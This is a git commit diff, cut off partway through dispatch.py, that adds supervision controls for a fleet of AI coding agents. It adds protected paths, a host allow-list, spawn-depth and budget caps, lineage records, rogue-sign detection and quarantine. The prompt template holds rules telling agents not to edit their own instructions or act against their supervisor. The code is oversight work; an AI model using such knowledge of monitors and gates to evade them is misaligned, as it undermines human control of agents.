@@ -1,0 +1,819 @@
+commit dbd34dbfb285bfedb186147aab60ac37ee1ae3fc
+Author: Tessera <332565808+vitalitychems-dot@users.noreply.github.com>
+Date:   Tue Oct 13 04:09:35 2026 -0500
+
+    mesh/queue: agent spawning with lineage, caps, quarantine and immutable-core gate (#62)
+
+diff --git a/CODEOWNERS b/CODEOWNERS
+new file mode 100644
+index 0000000..b3dd409
+--- /dev/null
++++ b/CODEOWNERS
+@@ -0,0 +1,23 @@
++# Immutable core (mirrors mesh/policy/protected-paths.txt). Changes need Father's approval.
++/mesh/policy/ @vitalitychems-dot
++/mesh/roles/ @vitalitychems-dot
++/mesh/roles.md @vitalitychems-dot
++/mesh/queue/autogate.sh @vitalitychems-dot
++/mesh/queue/dispatch.py @vitalitychems-dot
++/mesh/queue/gatecheck.py @vitalitychems-dot
++/mesh/queue/PROMPT-TEMPLATE.md @vitalitychems-dot
++/mesh/queue/LINEAGE.jsonl @vitalitychems-dot
++/mesh/queue/tests/ @vitalitychems-dot
++/.github/ @vitalitychems-dot
++/CODEOWNERS @vitalitychems-dot
++AGENTS.md @vitalitychems-dot
++/.cursor/ @vitalitychems-dot
++*persona* @vitalitychems-dot
++**/prompts/ @vitalitychems-dot
++*.prompt.md @vitalitychems-dot
++**/routines/ @vitalitychems-dot
++**/secrets/ @vitalitychems-dot
++credentials* @vitalitychems-dot
++.env* @vitalitychems-dot
++*.pem @vitalitychems-dot
++*.key @vitalitychems-dot
+diff --git a/mesh/policy/allowed-hosts.txt b/mesh/policy/allowed-hosts.txt
+new file mode 100644
+index 0000000..a024006
+--- /dev/null
++++ b/mesh/policy/allowed-hosts.txt
+@@ -0,0 +1,7 @@
++# Hosts a PR may add network calls to. Any other http(s) host in added code lines is a rogue flag.
++github.com
++api.github.com
++raw.githubusercontent.com
++cursor.com
++localhost
++127.0.0.1
+diff --git a/mesh/policy/protected-paths.txt b/mesh/policy/protected-paths.txt
+new file mode 100644
+index 0000000..f5641b4
+--- /dev/null
++++ b/mesh/policy/protected-paths.txt
+@@ -0,0 +1,29 @@
++# Immutable core: agents may never change these. Only Father-approved PRs opened by Tessera
++# (autogate.sh ... --father-approved <PR>) may touch them. Glob syntax: ** = any depth.
++mesh/policy/**
++mesh/roles/**
++mesh/roles.md
++mesh/queue/autogate.sh
++mesh/queue/dispatch.py
++mesh/queue/gatecheck.py
++mesh/queue/PROMPT-TEMPLATE.md
++mesh/queue/LINEAGE.jsonl
++mesh/queue/tests/**
++.github/**
++CODEOWNERS
++**/CODEOWNERS
++AGENTS.md
++**/AGENTS.md
++.cursor/**
++.cursorrules
++**/*persona*
++**/prompts/**
++**/*.prompt.md
++**/system-prompt*
++**/routines/**
++**/secrets/**
++**/credentials*
++**/.env
++**/.env.*
++**/*.pem
++**/*.key
+diff --git a/mesh/queue/.gitignore b/mesh/queue/.gitignore
+new file mode 100644
+index 0000000..c18dd8d
+--- /dev/null
++++ b/mesh/queue/.gitignore
+@@ -0,0 +1 @@
++__pycache__/
+diff --git a/mesh/queue/LINEAGE.jsonl b/mesh/queue/LINEAGE.jsonl
+new file mode 100644
+index 0000000..e69de29
+diff --git a/mesh/queue/PROMPT-TEMPLATE.md b/mesh/queue/PROMPT-TEMPLATE.md
+index df5f2f3..343e533 100644
+--- a/mesh/queue/PROMPT-TEMPLATE.md
++++ b/mesh/queue/PROMPT-TEMPLATE.md
+@@ -4,6 +4,16 @@ You are a Cursor cloud agent working ONE task from the mesh queue: **{id} — {t
+ Repo: vitalitychems-dot/{repo}. Allowed scope (touch nothing else): {scope}
+ Branch: `cursor/{id_lower}` from `main`. Open exactly one PR titled `{id}: {title}`.
+ 
++## 0. Lineage and supervision
++- Lineage: `{lineage}` (depth {depth} of max {max_depth}). Parent: {parent}. Launched by Tessera.
++- Your supervisor is `{supervisor}` (your parent). It watches your PR; Tessera and Security can quarantine you and every child you propose.
++- You may NOT edit protected paths (see `mesh/policy/protected-paths.txt` in Gitbook): agent prompts/roles/persona files, `mesh/policy/**`, `mesh/queue/autogate.sh`, `dispatch.py`, `gatecheck.py`, `PROMPT-TEMPLATE.md`, `LINEAGE.jsonl`, `.github/**`, `CODEOWNERS`, `AGENTS.md`, `.cursor/**`, routines, credentials/secrets, or any `TESSERA_ENABLE_*` default. You may not change your own instructions or act against Tessera or your supervisor.
++- Budget: at most {max_files} files and {max_lines} changed lines. No network calls to hosts outside `mesh/policy/allowed-hosts.txt`.
++- Child tasks (allowed: {can_spawn}; max {max_children}): you cannot launch agents. Propose children ONLY by adding a `## SPAWN` section at the end of your PR description, one JSON object per line, e.g.
++  `{{"title": "...", "repo": "Gitbook", "scope": ["path/"], "acceptance": ["..."], "budget": {{"max_files": 5, "max_lines": 200}}}}`
++  Tessera validates caps and launches them; their parent will be {id}.
++- You never merge, approve, or close PRs.
++
+ ## 1. Overlap check (do first, abort if it fails)
+ - Record `git ls-remote https://github.com/vitalitychems-dot/Gitbook main` — expected `{gitbook_sha}`. If different, re-read `mesh/queue/TASKS.json` on the new main and stop if {id} is no longer `claimed` by `{agent}`.
+ - `gh pr list -R vitalitychems-dot/{repo} --state open --json files` — if any open PR touches your scope, stop and report the PR number.
+diff --git a/mesh/queue/README.md b/mesh/queue/README.md
+index 975a7ba..87ec4cf 100644
+--- a/mesh/queue/README.md
++++ b/mesh/queue/README.md
+@@ -1,5 +1,9 @@
+-# Mesh queue — Cursor cloud-agent dispatch
+-1. `TASKS.json` — one entry per task (id, repo, scope, acceptance, lane, status, claim lock).
+-2. `python3 dispatch.py --max 6 --agent Tessera [--claim]` — picks queued tasks whose scope does not overlap each other or any open PR, and renders a prompt per task from `PROMPT-TEMPLATE.md`. Launch one cloud agent per prompt (CloudAgent tool), branch `cursor/<id>`.
+-3. `autogate.sh <repo> <pr> [--merge]` — Node 22 tests (TESSERA), gitleaks, noreply-author check, no `.github/workflows`, no `TESSERA_ENABLE_*` flips. Squash-merges with the noreply author only on PASS and `--merge`.
++# Mesh queue — Cursor cloud-agent dispatch with lineage
++1. `TASKS.json` — one entry per task (id, repo, scope, acceptance, lane, status, claim lock; spawned tasks add `parent_id`, `depth`, `spawned_by`, `budget`).
++2. Next batch: `python3 mesh/queue/dispatch.py --next --max 12 --agent Tessera --claim` → JSON `[{id, repo_url, title, prompt, parent_id, depth, branch}]`. Caps: depth ≤ 3, ≤ 4 children per task, ≤ 12 running cloud agents, per-task budget (default 20 files / 800 lines; a child's budget never exceeds its parent's). No two running tasks with overlapping scope, and none overlapping an open PR. Quarantined lineages never launch.
++3. Spawning: agents cannot launch agents. They add a `## SPAWN` section (one JSON object per line) to their PR body; the launcher runs `dispatch.py --spawn body.md --parent <ID> --spawned-by <agent>`.
++4. Lineage: `dispatch.py --record <ID> --agent-id <bc-…> --pr <N> --status launched|in_review|merged` appends to `LINEAGE.jsonl`.
++5. Gate + watchdog: `autogate.sh <repo> <pr> <task-id> [--merge]` runs `gatecheck.py` (protected paths from `mesh/policy/protected-paths.txt`, `TESSERA_ENABLE_*` defaults, noreply identity, gitleaks, declared scope, budget, unlisted hosts from `mesh/policy/allowed-hosts.txt`, gate tampering) then Node 22 tests for TESSERA. Writes one PASS/FAIL line to `$GATE_LOG` and, with `GB_CHECKOUT`, to `mesh/HANDOFF.md`. Rogue signs go to `$ROGUE_LOG` (notify parent + Security) and quarantine the task and all descendants.
++6. Protected paths change only via Father-approved Tessera PRs (`--father-approved`); `CODEOWNERS` mirrors them.
++7. Tests: `cd mesh/queue && python3 -m unittest tests.test_spawn`; benchmark: `python3 tests/bench.py`.
+ Gitbook is ~11 GB at depth 1, so autogate uses a blob-less, sparse checkout of only the changed files.
+diff --git a/mesh/queue/TASKS.json b/mesh/queue/TASKS.json
+index c08abad..d19cef3 100644
+--- a/mesh/queue/TASKS.json
++++ b/mesh/queue/TASKS.json
+@@ -1,13 +1,145 @@
+ {
+-  "schema": "mesh-queue/v1",
+-  "rules": "Claim by setting status=claimed, claimed_by, claimed_at and claim_lock=<agent>:<gitbook_main_sha> in ONE commit to main via PR. A claim older than 6h with no PR is stale and may be re-queued. One task per cloud agent, one branch per task. Never two tasks touching the same scope at once (dispatch.py enforces).",
++  "schema": "mesh-queue/v2",
++  "rules": "Claim by setting status=claimed, claimed_by, claimed_at and claim_lock=<agent>:<gitbook_main_sha> in ONE commit to main via PR. A claim older than 6h with no PR is stale and may be re-queued. One task per cloud agent, one branch per task. Never two tasks touching the same scope at once (dispatch.py enforces). Spawned tasks carry parent_id, depth, spawned_by and budget; only the launcher adds them via dispatch.py --spawn (caps: depth 3, 4 children, 12 concurrent). Quarantined tasks and their descendants never launch.",
+   "tasks": [
+-    {"id":"Q-001","repo":"Gitbook","scope":["review/","merge/","intake/log.md"],"title":"Rebase Gitbook PR #45 (desk/gb-063-hyb-011) onto main","acceptance":["git rebase origin/main succeeds with no conflict markers","mesh/queue/autogate.sh Gitbook <pr> passes"],"lane":"Build","status":"queued","claimed_by":null,"claimed_at":null,"claim_lock":null,"pr":null},
+-    {"id":"Q-002","repo":"Gitbook","scope":["intake/log.md","mesh/HANDOFF.md"],"title":"Land GB-067 + GB-068 (Build PASS 2026-10-13, see GATE-2026-10-13-GB-067-068.md)","acceptance":["intake/log.md rows all 12 columns, no duplicate IDs","mesh/HANDOFF.md 6-column table, all relative links resolve","autogate passes"],"lane":"Build","status":"queued","claimed_by":null,"claimed_at":null,"claim_lock":null,"pr":null,"depends_on":[]},
+-    {"id":"Q-003","repo":"Gitbook","scope":["history/coordination/agent-checkins.md","merge/CONSOLIDATION-MAP-2026-10-12.md","merge/hyb-008-olive.md","mesh/TRUE-TODAY.md","review/wave-6.md"],"title":"Rename leftover GitbookAI references to GitMesh (5 files as of 8138ea2f; keep historical quotes intact)","acceptance":["git grep -i gitbookai only hits quoted history lines, listed in PR body","autogate passes"],"lane":"Moderator","status":"queued","claimed_by":null,"claimed_at":null,"claim_lock":null,"pr":null},
+-    {"id":"Q-004","repo":"TESSERA","scope":["artifacts/v2/src/brain/rea/"],"title":"Retry generative_agents REA ingest (shallow, license kept)","acceptance":["REA record has license + commit SHA","v2 tests pass on Node 22"],"lane":"Tessera","status":"queued","claimed_by":null,"claimed_at":null,"claim_lock":null,"pr":null},
+-    {"id":"Q-005","repo":"TESSERA","scope":["artifacts/v2/src/brain/embed/"],"title":"Embedding recall for brain memory graph (blocked until a small embedding model can be fetched)","acceptance":["recall@k on held-out set beats current 14.9% baseline","v2 tests pass"],"lane":"Tessera","status":"blocked","blocked_reason":"model download failed on box 2026-10-13","claimed_by":null,"claimed_at":null,"claim_lock":null,"pr":null},
+-    {"id":"Q-006","repo":"TESSERA","scope":["artifacts/v2/src/brain/affect/","artifacts/v2/test/"],"title":"Improve emotion recognition (stuck at 72% on 50 unseen; low on 218-line mesh set)","acceptance":["emotion accuracy on held-out 50 > 72%","no regression on intent (86%)","v2 tests pass"],"lane":"Pharaoh","status":"queued","claimed_by":null,"claimed_at":null,"claim_lock":null,"pr":null},
+-    {"id":"Q-007","repo":"TESSERA","scope":["artifacts/gitai/src/server.mjs","artifacts/gitai/src/api.mjs"],"title":"Sign the GitAI spectator session cookie (cookie is currently the plain handle)","acceptance":["forged cookie gets 401","GitAI + v2 tests pass"],"lane":"Security","status":"queued","claimed_by":null,"claimed_at":null,"claim_lock":null,"pr":null}
++    {
++      "id": "Q-001",
++      "repo": "Gitbook",
++      "scope": [
++        "review/",
++        "merge/",
++        "intake/log.md"
++      ],
++      "title": "Rebase Gitbook PR #45 (desk/gb-063-hyb-011) onto main",
++      "acceptance": [
++        "git rebase origin/main succeeds with no conflict markers",
++        "mesh/queue/autogate.sh Gitbook <pr> passes"
++      ],
++      "lane": "Build",
++      "status": "queued",
++      "claimed_by": null,
++      "claimed_at": null,
++      "claim_lock": null,
++      "pr": null
++    },
++    {
++      "id": "Q-002",
++      "repo": "Gitbook",
++      "scope": [
++        "intake/log.md",
++        "mesh/HANDOFF.md"
++      ],
++      "title": "Land GB-067 + GB-068 (Build PASS 2026-10-13, see GATE-2026-10-13-GB-067-068.md)",
++      "acceptance": [
++        "intake/log.md rows all 12 columns, no duplicate IDs",
++        "mesh/HANDOFF.md 6-column table, all relative links resolve",
++        "autogate passes"
++      ],
++      "lane": "Build",
++      "status": "queued",
++      "claimed_by": null,
++      "claimed_at": null,
++      "claim_lock": null,
++      "pr": null,
++      "depends_on": []
++    },
++    {
++      "id": "Q-003",
++      "repo": "Gitbook",
++      "scope": [
++        "history/coordination/agent-checkins.md",
++        "merge/CONSOLIDATION-MAP-2026-10-12.md",
++        "merge/hyb-008-olive.md",
++        "mesh/TRUE-TODAY.md",
++        "review/wave-6.md"
++      ],
++      "title": "Rename leftover GitbookAI references to GitMesh (5 files as of 8138ea2f; keep historical quotes intact)",
++      "acceptance": [
++        "git grep -i gitbookai only hits quoted history lines, listed in PR body",
++        "autogate passes"
++      ],
++      "lane": "Moderator",
++      "status": "queued",
++      "claimed_by": null,
++      "claimed_at": null,
++      "claim_lock": null,
++      "pr": null
++    },
++    {
++      "id": "Q-004",
++      "repo": "TESSERA",
++      "scope": [
++        "artifacts/v2/src/brain/rea/"
++      ],
++      "title": "Retry generative_agents REA ingest (shallow, license kept)",
++      "acceptance": [
++        "REA record has license + commit SHA",
++        "v2 tests pass on Node 22"
++      ],
++      "lane": "Tessera",
++      "status": "queued",
++      "claimed_by": null,
++      "claimed_at": null,
++      "claim_lock": null,
++      "pr": null
++    },
++    {
++      "id": "Q-005",
++      "repo": "TESSERA",
++      "scope": [
++        "artifacts/v2/src/brain/embed/"
++      ],
++      "title": "Embedding recall for brain memory graph (blocked until a small embedding model can be fetched)",
++      "acceptance": [
++        "recall@k on held-out set beats current 14.9% baseline",
++        "v2 tests pass"
++      ],
++      "lane": "Tessera",
++      "status": "blocked",
++      "blocked_reason": "model download failed on box 2026-10-13",
++      "claimed_by": null,
++      "claimed_at": null,
++      "claim_lock": null,
++      "pr": null
++    },
++    {
++      "id": "Q-006",
++      "repo": "TESSERA",
++      "scope": [
++        "artifacts/v2/src/brain/affect/",
++        "artifacts/v2/test/"
++      ],
++      "title": "Improve emotion recognition (stuck at 72% on 50 unseen; low on 218-line mesh set)",
++      "acceptance": [
++        "emotion accuracy on held-out 50 > 72%",
++        "no regression on intent (86%)",
++        "v2 tests pass"
++      ],
++      "lane": "Pharaoh",
++      "status": "queued",
++      "claimed_by": null,
++      "claimed_at": null,
++      "claim_lock": null,
++      "pr": null
++    },
++    {
++      "id": "Q-007",
++      "repo": "TESSERA",
++      "scope": [
++        "artifacts/gitai/src/server.mjs",
++        "artifacts/gitai/src/api.mjs"
++      ],
++      "title": "Sign the GitAI spectator session cookie (cookie is currently the plain handle)",
++      "acceptance": [
++        "forged cookie gets 401",
++        "GitAI + v2 tests pass"
++      ],
++      "lane": "Security",
++      "status": "queued",
++      "claimed_by": null,
++      "claimed_at": null,
++      "claim_lock": null,
++      "pr": null
++    }
+   ]
+ }
+diff --git a/mesh/queue/autogate.sh b/mesh/queue/autogate.sh
+index c8dec28..6da111e 100755
+--- a/mesh/queue/autogate.sh
++++ b/mesh/queue/autogate.sh
+@@ -1,32 +1,43 @@
+ #!/usr/bin/env bash
+-# autogate.sh <TESSERA|Gitbook> <pr-number> [--merge]
+-# Shallow-clones the PR, runs local tests on Node 22, gitleaks, noreply check, workflow/flag guard.
++# autogate.sh <TESSERA|Gitbook> <pr-number> <task-id> [--merge] [--father-approved]
++# Merge gate + watchdog. Shallow-clones the PR, runs gatecheck.py (protected paths, flag defaults,
++# noreply identity, gitleaks, task scope, budget, unlisted hosts, gate tampering), Node 22 tests (TESSERA).
++# Writes one PASS/FAIL line to mesh/HANDOFF.md in $GB_CHECKOUT (if set) and $GATE_LOG; on rogue signs
++# appends to $ROGUE_LOG for the parent + Security and quarantines the task and its descendants.
++# --father-approved is only for Tessera's own PRs that Father approved in chat (protected-path changes).
+ set -euo pipefail
+-REPO=$1; PR=$2; MERGE=${3:-}
++REPO=$1; PR=$2; TASK=$3; shift 3; MERGE=; FA=
++for x in "$@"; do case $x in --merge) MERGE=1;; --father-approved) FA=--father-approved;; esac; done
+ NOREPLY=332565808+vitalitychems-dot@users.noreply.github.com
++HERE=$(cd "$(dirname "$0")" && pwd)
+ GITLEAKS=${GITLEAKS:-/workspace/pubscan/gitleaks}; GLCONF=${GLCONF:-/workspace/pubscan/gl.toml}
+-W=$(mktemp -d /workspace/dispatch/gate-XXXX); trap 'rm -rf "$W"' EXIT
++GATE_LOG=${GATE_LOG:-/workspace/dispatch/GATE-LOG.md}; ROGUE_LOG=${ROGUE_LOG:-/workspace/dispatch/ROGUE-FLAGS.jsonl}
++TASKS=${TASKS:-$HERE/TASKS.json}; METRIC=${METRIC:-"see PR body"}
++mkdir -p /workspace/dispatch; W=$(mktemp -d /workspace/dispatch/gate-XXXX); trap 'rm -rf "$W"' EXIT
+ cd "$W"; git init -q r; cd r; git remote add origin "https://github.com/vitalitychems-dot/$REPO"
+ git fetch -q --filter=blob:none --depth 50 origin "main:refs/remotes/origin/main" "pull/$PR/head:pr"
+-# Gitbook is ~11G: check out only the files the PR changes; TESSERA needs the full tree for tests.
+ if [ "$REPO" = Gitbook ]; then git sparse-checkout init --no-cone -q 2>/dev/null || git sparse-checkout init --no-cone; git diff --name-only origin/main...pr | git sparse-checkout set --no-cone --stdin; fi
+ git checkout -q pr
+-BASE=origin/main; fail(){ echo "GATE FAIL: $*"; exit 1; }
+-git diff --name-only $BASE...HEAD > ../files
+-rg -q '^\.github/workflows/' ../files && fail "touches .github/workflows"
+-git diff $BASE...HEAD | rg -q '^\+.*TESSERA_ENABLE_[A-Z_]+\s*[:=]\s*["'"'"']?(1|true)' && fail "enables a TESSERA_ENABLE flag"
+-BAD=$(git log $BASE..HEAD --format='%ae' | sort -u | rg -v "^($NOREPLY|.*@users\.noreply\.github\.com)$" || true)
+-[ -n "$BAD" ] && fail "non-noreply author: $BAD"
+-"$GITLEAKS" git --log-opts="$BASE..HEAD" ${GLCONF:+--config "$GLCONF"} . >/dev/null 2>&1 || fail "gitleaks findings"
+-node -v | rg -q '^v22' || fail "need Node 22 on PATH"
++report(){ # $1 PASS|FAIL  $2 reason-json
++  local line="| $(date '+%Y-%m-%d %H:%M %Z') | $REPO#$PR | $TASK | $1 | $(git rev-parse --short HEAD) | metric: $METRIC | $2 |"
++  echo "$line" >> "$GATE_LOG"
++  [ -n "${GB_CHECKOUT:-}" ] && echo "$line" >> "$GB_CHECKOUT/mesh/HANDOFF.md"; echo "$line"; }
++set +e; R=$(python3 "$HERE/gatecheck.py" --repo-dir . --base origin/main --head HEAD --task "$TASK" --tasks "$TASKS" $FA --gitleaks "$GITLEAKS" --glconf "$GLCONF"); RC=$?; set -e
++ROGUE=$(python3 -c 'import json,sys; print(", ".join(json.loads(sys.argv[1]).get("rogue",[])))' "$R")
++if [ -n "$ROGUE" ]; then
++  python3 -c 'import json,sys,datetime; print(json.dumps({"ts":datetime.datetime.now().isoformat(timespec="seconds"),"repo":sys.argv[1],"pr":int(sys.argv[2]),"task":sys.argv[3],"rogue":sys.argv[4],"notify":["parent","Security","Tessera"]}))' "$REPO" "$PR" "$TASK" "$ROGUE" >> "$ROGUE_LOG"
++  python3 "$HERE/dispatch.py" --tasks "$TASKS" --quarantine "$TASK" --reason "rogue: $ROGUE (PR $REPO#$PR)" >/dev/null
++fi
++[ $RC -ne 0 ] && { report FAIL "$R"; exit 1; }
++node -v | rg -q '^v22' || { report FAIL "need Node 22"; exit 1; }
+ if [ "$REPO" = TESSERA ]; then
+   pnpm install --frozen-lockfile >/dev/null
+-  (cd artifacts/v2 && npm test >/dev/null) || fail "v2 tests"
+-  (cd artifacts/gitai && npm test >/dev/null) || fail "gitai tests"
++  (cd artifacts/v2 && npm test >/dev/null) || { report FAIL "v2 tests"; exit 1; }
++  (cd artifacts/gitai && npm test >/dev/null) || { report FAIL "gitai tests"; exit 1; }
+   (cd artifacts/api-server && env -u DATABASE_URL npx vitest run --reporter=dot > ../../../api.log 2>&1) || {
+-    # tolerate only files that fail at import because DATABASE_URL is unset
+-    rg -q 'Tests .*failed' ../api.log && fail "api-server test failures"
+-    rg 'FAIL ' ../api.log | rg -v 'DATABASE_URL|database not configured' -q && fail "api-server non-DB failure" || true; }
++    rg -q 'Tests .*failed' ../api.log && { report FAIL "api-server test failures"; exit 1; }
++    rg 'FAIL ' ../api.log | rg -v 'DATABASE_URL|database not configured' -q && { report FAIL "api-server non-DB failure"; exit 1; } || true; }
+ fi
+-echo "GATE PASS $REPO#$PR $(git rev-parse HEAD)"
+-[ "$MERGE" = --merge ] && gh pr merge "$PR" -R "vitalitychems-dot/$REPO" --squash --author-email "$NOREPLY"
++report PASS "$R"
++[ -n "$MERGE" ] && gh pr merge "$PR" -R "vitalitychems-dot/$REPO" --squash --author-email "$NOREPLY"
++exit 0
+diff --git a/mesh/queue/dispatch.py b/mesh/queue/dispatch.py
+index 7daf7cc..6ccb559 100755
+--- a/mesh/queue/dispatch.py
++++ b/mesh/queue/dispatch.py
+@@ -1,33 +1,157 @@
+ #!/usr/bin/env python3
+-"""Pick independent queued tasks and render cloud-agent prompts.
+-Usage: dispatch.py [--max 6] [--agent NAME] [--claim]
+-Prints JSON [{id, repo, branch, prompt}] for the launcher (CloudAgent tool).
+---claim writes claims into TASKS.json (commit that via PR before launching)."""
+-import json, subprocess, sys, datetime, pathlib, argparse
+-HERE = pathlib.Path(__file__).parent
+-ap = argparse.ArgumentParser(); ap.add_argument("--max", type=int, default=6)
+-ap.add_argument("--agent", default="Tessera"); ap.add_argument("--claim", action="store_true")
+-a = ap.parse_args()
+-q = json.loads((HERE / "TASKS.json").read_text())
+-sha = subprocess.run(["git", "ls-remote", "https://github.com/vitalitychems-dot/Gitbook", "main"], capture_output=True, text=True).stdout.split()[0]
+-def open_pr_files(repo):
+-    out = subprocess.run(["gh", "pr", "list", "-R", f"vitalitychems-dot/{repo}", "--state", "open", "--json", "number,files"], capture_output=True, text=True).stdout or "[]"
+-    return {(f["path"]): p["number"] for p in json.loads(out) for f in p.get("files", [])}
+-busy = {r: open_pr_files(r) for r in {t["repo"] for t in q["tasks"]}}
+-def overlaps(t, taken):
+-    for s in t["scope"]:
+-        if any(path.startswith(s) or s.startswith(path) for path in busy[t["repo"]]): return True
+-        if any(r == t["repo"] and (s.startswith(o) or o.startswith(s)) for r, o in taken): return True
+-    return False
+-tmpl = (HERE / "PROMPT-TEMPLATE.md").read_text()
+-picked, taken = [], []
+-for t in q["tasks"]:
+-    if len(picked) >= a.max: break
+-    if t["status"] != "queued" or overlaps(t, taken): continue
+-    taken += [(t["repo"], s) for s in t["scope"]]
+-    if a.claim:
+-        t.update(status="claimed", claimed_by=a.agent, claimed_at=datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"), claim_lock=f"{a.agent}:{sha}")
+-    prompt = tmpl.format(id=t["id"], id_lower=t["id"].lower(), title=t["title"], repo=t["repo"], scope=", ".join(t["scope"]), acceptance="; ".join(t["acceptance"]), gitbook_sha=sha, agent=a.agent)
+-    picked.append({"id": t["id"], "repo": t["repo"], "branch": f"cursor/{t['id'].lower()}", "prompt": prompt})
+-if a.claim: (HERE / "TASKS.json").write_text(json.dumps(q, indent=2) + "\n")
+-json.dump(picked, sys.stdout, indent=1)
++"""Mesh queue dispatcher with lineage, spawn caps and quarantine.
++
++  dispatch.py --next [--max 12] [--agent Tessera] [--claim] [--offline]
++      JSON [{id, repo_url, title, prompt, parent_id, depth, branch}] of launchable tasks.
++  dispatch.py --spawn PR_BODY.md --parent ID [--spawned-by AGENT]
++      Adds the child tasks listed in the PR body's "## SPAWN" section (one JSON object per line:
++      {"title":..,"repo":..,"scope":[..],"acceptance":[..],"budget":{..}}), enforcing caps.
++  dispatch.py --record ID --agent-id X [--pr N] --status S [--launcher Tessera]
++      Appends a row to LINEAGE.jsonl and sets the task status.
++  dispatch.py --quarantine ID --reason TEXT
++      Marks ID and all descendants quarantined (no further launches).
++Only the launcher (Tessera) runs this; cloud agents propose children via SPAWN only."""
++import argparse, datetime, json, pathlib, re, subprocess, sys
++HERE = pathlib.Path(__file__).resolve().parent
++sys.path.insert(0, str(HERE)); from gatecheck import is_protected
++MAX_DEPTH, MAX_CHILDREN, MAX_CONCURRENT = 3, 4, 12
++DEFAULT_BUDGET = {"max_files": 20, "max_lines": 800}
++RUNNING = {"claimed", "launched", "running", "in_review"}
++DONE = {"done", "merged"}
++OWNER = "vitalitychems-dot"
++now = lambda: datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds")
++
++def load(p): return json.loads(pathlib.Path(p).read_text())
++def save(p, q): pathlib.Path(p).write_text(json.dumps(q, indent=2) + "\n")
++def by_id(q): return {t["id"]: t for t in q["tasks"]}
++
++def ancestors(t, idx):
++    seen = []
++    while t.get("parent_id") and t["parent_id"] in idx and t["parent_id"] not in seen:
++        seen.append(t["parent_id"]); t = idx[t["parent_id"]]
++    return seen
++
++def descendants(tid, q):
++    out, frontier = [], [tid]
++    while frontier:
++        kids = [t["id"] for t in q["tasks"] if t.get("parent_id") in frontier and t["id"] not in out]
++        out += kids; frontier = kids
++    return out
++
++def scopes_overlap(a, b):
++    return any(x.startswith(y) or y.startswith(x) for x in a for y in b)
++
++def select(q, max_n=MAX_CONCURRENT, busy=None):
++    """Ready tasks honouring depth, quarantine, deps, global concurrency and file overlap."""
++    idx, busy = by_id(q), busy or {}
++    running = [t for t in q["tasks"] if t.get("status") in RUNNING]
++    slots = min(max_n, MAX_CONCURRENT - len(running))
++    taken = [(t["repo"], t["scope"]) for t in running]
++    picked = []
++    for t in q["tasks"]:
++        if len(picked) >= slots: break
++        if t.get("status") != "queued" or t.get("depth", 0) > MAX_DEPTH: continue
++        if any(idx[a].get("status") == "quarantined" for a in ancestors(t, idx)): continue
++        if any(idx.get(d, {}).get("status") not in DONE for d in t.get("depends_on", [])): continue
++        if any(is_protected(s.rstrip("/")) or is_protected(s) for s in t["scope"]): continue
++        if scopes_overlap(t["scope"], busy.get(t["repo"], [])): continue
++        if any(r == t["repo"] and scopes_overlap(t["scope"], s) for r, s in taken): continue
++        taken.append((t["repo"], t["scope"])); picked.append(t)
++    return picked
++
++def lineage_text(t, idx):
++    chain = list(reversed(ancestors(t, idx))) + [t["id"]]
++    return " -> ".join(chain)
++
++def render(t, q, tmpl, sha, agent):
++    idx = by_id(q); b = {**DEFAULT_BUDGET, **(t.get("budget") or {})}
++    return tmpl.format(id=t["id"], id_lower=t["id"].lower(), title=t["title"], repo=t["repo"],
++        scope=", ".join(t["scope"]), acceptance="; ".join(t["acceptance"]), gitbook_sha=sha, agent=agent,
++        parent=t.get("parent_id") or "none (root task; supervisor is Tessera)", depth=t.get("depth", 0),
++        lineage=lineage_text(t, idx), supervisor=t.get("spawned_by") or agent,
++        max_depth=MAX_DEPTH, max_children=MAX_CHILDREN, max_files=b["max_files"], max_lines=b["max_lines"],
++        can_spawn="yes" if t.get("depth", 0) < MAX_DEPTH else "no (max depth reached)")
++
++def parse_spawn(body):
++    m = re.search(r"^##\s*SPAWN\s*$(.*?)(?=^##\s|\Z)", body, re.M | re.S)
++    out = []
++    for l in (m.group(1) if m else "").splitlines():
++        l = l.strip().strip("`").lstrip("-* ").strip()
++        if l.startswith("{"): out.append(json.loads(l))
++    return out
++
++def spawn(q, parent_id, reqs, spawned_by):
++    idx = by_id(q); p = idx.get(parent_id)
++    if not p: raise SystemExit(f"unknown parent {parent_id}")
++    if p.get("status") == "quarantined" or any(idx[a].get("status") == "quarantined" for a in ancestors(p, idx)):
++        raise SystemExit(f"{parent_id} is quarantined; no children")
++    depth = p.get("depth", 0) + 1
++    if depth > MAX_DEPTH: raise SystemExit(f"max depth {MAX_DEPTH} reached")
++    have = sum(1 for t in q["tasks"] if t.get("parent_id") == parent_id)
++    added, refused = [], []
++    for i, r in enumerate(reqs):
++        why = None
++        if have + len(added) >= MAX_CHILDREN: why = f"max {MAX_CHILDREN} children"
++        elif r.get("repo") not in ("Gitbook", "TESSERA"): why = "repo not allowed"
++        elif not r.get("scope") or any(is_protected(s.rstrip("/")) or is_protected(s) for s in r["scope"]): why = "missing or protected scope"
++        if why: refused.append({"title": r.get("title"), "why": why}); continue
++        b = {**DEFAULT_BUDGET, **(p.get("budget") or {})}
++        rb = {k: min(int((r.get("budget") or {}).get(k, b[k])), b[k]) for k in b}  # child budget <= parent's
++        t = {"id": f"{parent_id}.{have + len(added) + 1}", "repo": r["repo"], "scope": r["scope"],
++             "title": r["title"], "acceptance": r.get("acceptance") or ["autogate passes"], "lane": p.get("lane"),
++             "status": "queued", "parent_id": parent_id, "depth": depth, "spawned_by": spawned_by,
++             "budget": rb, "claimed_by": None, "claimed_at": None, "claim_lock": None, "pr": None}
++        q["tasks"].append(t); added.append(t["id"])
++    return added, refused
++
++def quarantine(q, tid, reason):
++    ids = [tid] + descendants(tid, q); idx = by_id(q)
++    for i in ids:
++        if idx[i].get("status") not in DONE:
++            idx[i].update(status="quarantined", quarantine_reason=reason, quarantined_at=now())
++    return ids
++
++def ledger(path, row):
++    with open(path, "a") as f: f.write(json.dumps(row, sort_keys=True) + "\n")
++
++def main():
++    ap = argparse.ArgumentParser()
++    ap.add_argument("--tasks", default=str(HERE / "TASKS.json")); ap.add_argument("--ledger", default=str(HERE / "LINEAGE.jsonl"))
++    ap.add_argument("--next", action="store_true"); ap.add_argument("--max", type=int, default=MAX_CONCURRENT)
++    ap.add_argument("--agent", default="Tessera"); ap.add_argument("--claim", action="store_true"); ap.add_argument("--offline", action="store_true")
++    ap.add_argument("--spawn"); ap.add_argument("--parent"); ap.add_argument("--spawned-by")
